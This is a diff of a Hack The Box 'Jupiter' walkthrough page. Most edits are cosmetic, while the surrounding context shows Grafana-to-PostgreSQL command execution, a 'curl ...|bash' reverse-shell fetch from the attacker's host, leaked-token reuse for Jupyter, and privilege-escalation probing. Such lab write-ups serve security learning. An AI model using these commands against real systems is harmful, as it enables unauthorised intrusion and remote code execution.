@@ -5,58 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Jupiter - HTB</title>
     <meta name="description" content="Artículos técnicos sobre ciberseguridad, Active Directory, Binary Exploitation y más">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet" media="print" onload="this.media='all'">
+    <noscript><link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" rel="stylesheet"></noscript>
     <link href="/css/styles.css" rel="stylesheet">
     <link href="/css/articles.css" rel="stylesheet">
     <link href="/css/monokai.css" rel="stylesheet">
     <link rel="icon" href="/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <button class="sidebar-toggle" id="sidebarToggle">☰</button>
+    <button class="sidebar-toggle" id="sidebarToggle"><i class="bi bi-list"></i></button>
     <div class="container-fluid">
         <div class="row">
             <!-- Sidebar -->
             <aside class="sidebar" id="sidebar">
                 <div class="sidebar-logo">
-                    <img src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
+                    <img width="160" height="160" src="/img/new-logo.png" alt="elswix Logo" onerror="this.src='https://via.placeholder.com/120/ff3b5c/ffffff?text=elswix'">
                     <h3>elswix</h3>
+                    <span class="sidebar-role">Red Team Database</span>
                 </div>
                 <nav>
                     <ul class="nav-menu">   
                         <li class="nav-item">
                             <a href="/" class="nav-link">
-                                <i>🏠</i>
+                                <i class="bi bi-house-door"></i>
                                 <span>Home</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/articles" class="nav-link active">
-                                <i>📝</i>
+                                <i class="bi bi-journal-code"></i>
                                 <span>Articles</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/writeups" class="nav-link">
-                                <i>💻</i>
+                                <i class="bi bi-terminal"></i>
                                 <span>WriteUps</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/notes" class="nav-link">
-                                <i>📚</i>
+                                <i class="bi bi-folder2-open"></i>
                                 <span>Notes</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="https://github.com/elswix/KL-Sunset" target="_blank" class="nav-link">
-                                <i>⚡</i>
+                                <i class="bi bi-bug"></i>
                                 <span>KL-Sunset</span>
                             </a>
                         </li>
                         <li class="nav-item">
                             <a href="/about" class="nav-link">
-                                <i>👤</i>
+                                <i class="bi bi-person-badge"></i>
                                 <span>About me</span>
                             </a>
                         </li>
@@ -68,7 +72,7 @@
             <main>
                 <!-- Hero Section -->
                 <section class="hero mb-5">
-                    <img src="/writeups/htb/medium/jupiter/img/jupiter.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=📝'">
+                    <img src="/writeups/htb/medium/jupiter/img/jupiter.png" alt="Article logo" style="width: 120px; height: 120px; border-radius: 50%" onerror="this.src='https://via.placeholder.com/140/ff3b5c/ffffff?text=elswix'">
                     <h2>Jupiter - HTB</h2>
                     <p>walkthrough by elswixHackTheBox</p>
                 </section>
@@ -140,7 +144,7 @@ Since we can't access <code>jupiter.htb</code> we need to add it to our <code>/e
 </pre></div>
 
 When we access the website through our browser, we encounter the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/1.png"><br/><br/>
+<img width="1347" height="505" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/1.png"><br/><br/>
 At this stage, there isn't much to do, so let's explore other avenues<br/><br/>
 <h3><br/>Subdomain Enumeration</h3><br/>
 Using tools like <a href="https://github.com/ffuf/ffuf">ffuf</a> or <a href="https://github.com/OJ/gobuster">gobuster</a>, we can conduct subdomain enumeration through a brute force attack. In my case, I will use <a href="https://github.com/ffuf/ffuf">ffuf</a> for this scan:<br><br/>
@@ -228,32 +232,32 @@ We've discovered the <code>kiosk</code> subdomain. Now, let's add this subdomain
 </pre></div>
 
 Now, if we attempt to access <code>kiosk.jupiter.htb</code>, we encounter the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/2.png"><br/><br/>
+<img width="1344" height="502" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/2.png"><br/><br/>
 Grafana is running behind the scenes. For those who may not be familiar with Grafana, it's an open-source platform used for real-time data visualization and monitoring. It enables the creation of interactive dashboards and graphs using data from various sources, including databases, cloud services, monitoring systems, and more. Grafana is extensively utilized in the realms of system administration and application monitoring to visualize data and performance metrics in a user-friendly and customizable manner.<br/><br/>
 Although we ran a <a href="https://addons.mozilla.org/es/firefox/addon/wappalyzer/">Wappalyzer</a> scan, it did not provide information about the specific version of Grafana in use, thus yielding no useful information.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/3.png"/><br/><br/>
+<img width="488" height="518" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/3.png"/><br/><br/>
 When examining the requests made while accessing the site, one request stands out as particularly interesting:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/4.png"/><br/><br/>
+<img width="782" height="132" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/4.png"/><br/><br/>
 POST requests are being sent to <code>/api/ds/query</code>. If we inspect the data we are sending, we can observe the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/5.png"/><br/><br/>
+<img width="597" height="329" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/5.png"/><br/><br/>
 There is an SQL query, and it appears to be targeting a database endpoint of the API. This seems quite promising. After conducting some research online, I came across a method to execute commands in PostgreSQL. However, it's worth noting that this method only works if the server is running PostgreSQL version 9.3 to 11.2, as detailed in this <a href="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5">article</a>.<br/><br/>
 It's important to emphasize that this isn't a vulnerability by default, as command execution relies on the presence of a privilege (<code>pg_execute_server_program</code>) that must be manually assigned to the user. Nevertheless, if the privilege is active, and an attacker gains control over a user with this privilege, it could lead to command execution.<br/><br/>
 We can attempt to retrieve the PostgreSQL version by sending the following query:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">();</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/6.png"/><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/7.png"/><br/><br/>
+<img width="304" height="217" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/6.png"/><br/><br/>
+<img width="550" height="143" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/7.png"/><br/><br/>
 It's running PostgreSQL version 14.8. Now, let's verify if the user can execute commands:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">SELECT</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolname</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolsuper</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolinherit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreaterole</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcreatedb</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolcanlogin</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolconnlimit</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolvaliduntil</span><span class="p">,</span><span class="w"> </span><span class="nb">ARRAY</span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">rolname</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_auth_members</span><span class="w"> </span><span class="n">m</span><span class="w"> </span><span class="k">JOIN</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="k">ON</span><span class="w"> </span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">roleid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">b</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">m</span><span class="p">.</span><span class="n">member</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">oid</span><span class="p">)</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">memberof</span><span class="w"> </span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">.</span><span class="n">rolreplication</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">pg_catalog</span><span class="p">.</span><span class="n">pg_roles</span><span class="w"> </span><span class="n">r</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/8.png"/><br/><br/>
+<img width="693" height="267" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/8.png"/><br/><br/>
 Upon examining the response, we ascertain that we have the ability to execute commands, as we possess the <code>pg_execute_server_program</code> privilege.<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/9.png"/><br/><br/>
+<img width="360" height="234" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/9.png"/><br/><br/>
 In order to execute commands, we need to begin by creating a table:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">cmd_exec</span><span class="p">(</span><span class="n">cmd_output</span><span class="w"> </span><span class="nb">text</span><span class="p">);</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/10.png"/><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/11.png"/><br/><br/>
+<img width="434" height="214" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/10.png"/><br/><br/>
+<img width="264" height="310" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/11.png"/><br/><br/>
 Now, let's verify if we can execute commands. To do this, we'll start by listening with an HTTP server on port 80:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
@@ -262,7 +266,7 @@ Now, let's verify if we can execute commands. To do this, we'll start by listeni
 Now, let's send the following query:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">'curl 10.10.16.3'</span><span class="p">;</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/12.png"/><br/><br/>
+<img width="473" height="218" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/12.png"/><br/><br/>
 If we monitor our listener, we can observe the request originating from the victim's machine:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">80</span>
 <span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="mf">0.0.0.0</span> <span class="n">port</span> <span class="mi">80</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
@@ -290,7 +294,7 @@ Let's set up our netcat listener on port 3001:<br/><br/>
 Now, using the following query, we will send the reverse shell:<br/><br/>
 <div class="highlight"><pre><span></span><span class="k">COPY</span><span class="w"> </span><span class="n">cmd_exec</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">PROGRAM</span><span class="w"> </span><span class="s1">'curl 10.10.16.3/pwned.sh|bash'</span><span class="p">;</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/13.png"/><br/><br/>
+<img width="596" height="222" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/13.png"/><br/><br/>
 Now, checking our listener, we've successfully received the reverse shell:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
@@ -362,7 +366,7 @@ After uploading pspy to the victim machine, let's run it:<br/><br/>
 </pre></div>
 
 After a short wait, I came across this:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/14.png"/><br/><br/>
+<img width="1138" height="117" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/14.png"/><br/><br/>
 Juno is running a binary that I can't access, and it is including a file in the <code>/dev/shm</code> directory. Upon examining <code>network-simulation.yml</code>, it's evident that commands specified in this file are being executed.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">postgres@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">shm</span><span class="err">$</span> <span class="n">cat</span> <span class="n">network</span><span class="o">-</span><span class="n">simulation</span><span class="o">.</span><span class="n">yml</span> 
 <span class="n">general</span><span class="p">:</span>
@@ -657,7 +661,7 @@ Checking the open ports, we observe that port <code>8888</code> is open. This ap
 </pre></div>
 
 Now, when I attempt to access <code>localhost</code> on port <code>8888</code>, I encounter the following:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/15.png"/><br/><br/>
+<img width="1348" height="502" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/15.png"/><br/><br/>
 It is requesting a password or token, which we currently lack. While searching for the term <code>token</code> in the <code>solar-flares</code> directory, I discovered some intriguing values:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="n">token</span>
 </pre></div>
@@ -684,18 +688,18 @@ The results are originating from the <code>logs</code> directory, as exemplified
 </pre></div>
 
 I will attempt to use the token <code>c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</code> on the website. Let's see if it works:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/16.png"/><br/><br/>
+<img width="1358" height="378" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/16.png"/><br/><br/>
 It seems the previous token didn't work, so there's nothing more we can do. However, after trying each one individually, the token <code>af894b54c19a51d83d04cd69d9d205a975cafbd882d70971</code> did work, and the website redirected me to the next page:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/17.png"/><br/><br/>
+<img width="1354" height="500" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/17.png"/><br/><br/>
 While examining the <code>Running</code> section, I came across the following list of Jupyter running processes:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/18.png"/><br/><br/>
+<img width="1283" height="273" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/18.png"/><br/><br/>
 I clicked on <code>flares.ipynb</code>, and it redirected me to the next page:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/19.png"/><br/><br/>
+<img width="1263" height="499" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/19.png"/><br/><br/>
 Since this is running Python code, I'm going to create my own notebook:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/20.png"/><br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/21.png"/><br/><br/>
+<img width="727" height="167" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/20.png"/><br/><br/>
+<img width="1223" height="298" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/21.png"/><br/><br/>
 Here, it's requesting Python code. Let's attempt to execute system-level commands. I will try to send a ping to my attacker machine:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/22.png"/><br/><br/>
+<img width="943" height="241" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/22.png"/><br/><br/>
 Before running this command, I will set up an ICMP listener:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
 <span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
@@ -703,7 +707,7 @@ Before running this command, I will set up an ICMP listener:<br/><br/>
 </pre></div>
 
 Now, I will click <code>Run</code>:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/23.png"/><br/><br/>
+<img width="1144" height="283" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/23.png"/><br/><br/>
 It worked, and I received a ping from the victim machine:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
 <span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
@@ -720,7 +724,7 @@ Now, I'm going to send myself a reverse shell, so I'll set up my netcat listener
 </pre></div>
 
 I will now execute the following command:<br/><br/>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/24.png"/><br/><br/>
+<img width="911" height="75" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/24.png"/><br/><br/>
 And I have successfully obtained a shell as the <code>Jovian</code> user:<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
 <span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
@@ -783,7 +787,7 @@ After executing <code>/usr/local/bin/sattrack</code> as root, it returns the fol
 I believe it's attempting to open a configuration file. Before attempting to reverse-engineer this program, I will run it with <code>strace</code> since it's installed on the victim machine.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">strace</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
 </pre></div>
-<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/25.png"/><br/><br/>
+<img width="1095" height="346" loading="lazy" decoding="async" alt="" src="/writeups/htb/medium/jupiter/img/25.png"/><br/><br/>
 It's trying to open the <code>/tmp/config.json</code> file, but it doesn't exist.<br/><br/>
 <div class="highlight"><pre><span></span><span class="nd">jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
 <span class="n">cat</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
